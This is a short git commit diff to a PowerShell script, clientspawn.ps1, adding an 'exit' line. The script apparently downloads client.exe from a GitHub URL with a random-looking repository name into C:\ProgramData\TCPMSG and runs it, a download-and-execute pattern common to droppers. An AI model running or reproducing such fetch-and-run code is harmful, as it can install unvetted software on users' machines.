79ce6e08e8694016f10778e883575dfec51308c6
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2022-08-29 23:08:54 -0400

    Update clientspawn.ps1

--- clientspawn.ps1
+++ clientspawn.ps1
@@ -3,3 +3,4 @@ $source = 'https://raw.githubusercontent.com/RedTheMenace/werwetfgawsergw345w3ts
 $destination = 'C:\ProgramData\TCPMSG\client.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
 Start-Process C:\ProgramData\TCPMSG\client.exe
+exit
